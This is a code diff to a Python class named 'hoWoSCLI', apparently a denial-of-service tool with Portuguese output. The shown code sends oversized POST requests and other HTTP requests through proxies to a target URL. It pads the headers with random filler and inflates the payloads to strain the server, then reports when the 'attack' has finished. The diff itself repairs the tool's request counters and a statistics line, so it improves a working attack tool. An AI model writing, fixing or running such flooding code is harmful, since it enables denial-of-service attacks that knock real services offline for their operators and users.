@@ -252,22 +252,22 @@ class hoWoSCLI:
                     for i in range(20):
                         headers[f"X-Filler-{i}"] = random.choice(['A', 'B', 'DoS']) * random.randint(150, 250)
                     payload = bytes_payload * random.randint(20, 70)
-                    self.req_sent + 1
+                    self.req_sent += 1
                     #endregion
 
                     #region BIGREQ
                     async with session.post(self.target_url, headers=headers, data=payload, timeout=10) as resp:
-                        self.req_success + 1
+                        self.req_success += 1
                         if self.verbose:
                             print(f"[BIGREQ] via {proxy_url} | Status: {resp.status}")
                             
                 else:
-                    self.req_sent + 1
+                    self.req_sent += 1
                     #endregion
                     
                     #region HTTP
                     async with session.request(method, self.target_url, headers=headers, timeout=7) as resp:
-                        self.req_success + 1
+                        self.req_success += 1
                         if self.verbose:
                             print(f"[{method}] via {proxy_url} | Status: {resp.status}")
 
@@ -309,7 +309,7 @@ class hoWoSCLI:
 
         elapsed = time.time() - start
         print(f"\n[?] Requisições definidas pelo usúario: {self.num_requests}")
-        print(f"[?] Requisições enviadas: {self.req_sent} ({str((self.num_requests / self.req_sent) * 100) if self.req_sent > 0 else '0'})%")
+        print(f"[?] Requisições enviadas: {self.req_sent}")
         print(f"[?] Requisições recebidas pelo alvo: {self.req_success}")
         print(f"\n[✓] Ataque finalizado em {elapsed:.2f} segundos\n")
     #endregion
